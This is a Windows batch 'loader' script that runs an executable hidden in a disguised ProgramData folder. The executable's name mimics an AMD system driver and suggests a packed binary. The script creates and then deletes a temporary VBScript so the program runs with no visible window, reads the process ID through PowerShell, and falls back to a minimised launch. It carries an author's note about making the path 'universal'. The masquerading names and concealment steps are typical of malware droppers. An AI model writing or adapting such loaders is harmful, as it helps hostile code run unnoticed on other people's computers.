@echo off
setlocal enabledelayedexpansion

:: Set the path to the executable
set "exe_path=C:/ProgramData/.diagnostic.txt/amdkmpfd.sys.vmp.exe" --> change this to be universal

:: Method 1: Simple launch (hidden using VBScript)
echo Method 1: Simple hidden launch...
if exist "%exe_path%" (
    echo File found, launching...
    
    :: Create a temporary VBScript to run hidden
    echo Set WshShell = CreateObject("WScript.Shell") > "%temp%\runhidden.vbs"
    echo WshShell.Run chr(34) ^& "%exe_path%" ^& chr(34), 0, False >> "%temp%\runhidden.vbs"
    cscript //nologo "%temp%\runhidden.vbs"
    del "%temp%\runhidden.vbs"
    
    :: Get PID using PowerShell (Windows 7+)
    echo Trying to get process ID...
    powershell -Command "Get-Process -Name 'amdkmpfd.sys.vmp' -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id" > "%temp%\pid.txt" 2>nul
    set /p PID=<"%temp%\pid.txt"
    if defined PID (
        echo Process started with PID: !PID!
    ) else (
        echo Process started (PID unknown)
    )
    del "%temp%\pid.txt" 2>nul
) else (
    echo Error: File not found: %exe_path%
    goto :method2
)

echo.
echo Loader execution completed.
pause
exit /b

:method2
:: Method 2: Alternative launch using start command
echo.
echo Method 2: Trying alternative launch method...
if exist "%exe_path%" (
    echo Launching with start command...
    
    :: Launch minimized
    start "" /MIN "%exe_path%"
    
    :: Alternative: Launch completely hidden (if supported by exe)
    :: start "" /B "%exe_path%"
    
    echo Process launched via start command
) else (
    echo Error: File still not found
)

echo.
echo Loader execution completed.
pause